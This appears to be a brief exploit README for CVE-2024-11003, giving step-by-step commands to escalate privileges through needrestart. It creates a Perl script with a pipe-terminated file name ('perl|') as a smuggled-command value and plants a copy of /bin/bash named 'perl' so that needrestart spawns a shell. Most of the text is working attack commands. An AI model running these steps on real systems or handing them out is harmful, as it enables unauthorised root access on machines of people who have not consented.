# CVE-2024-11003

## Steps to Exploit

### 1. Create a Perl script
Create a file named `perl|` and add the following code:

```perl
#!/usr/bin/perl

sleep(3600)
```

### 2. Make the file executable
Use the following command to make the file executable:

```bash
chmod +x perl\|
```

### 3. Run the script
Execute the script:

```bash
./perl\|
```

### 4. Copy `/bin/bash` to the same directory
Copy the `bash` binary to the same directory and rename it as `perl`:

```bash
cp /bin/bash perl
```

### 5. Wait for needrestart
Once needrestart starts, you will get a shell.
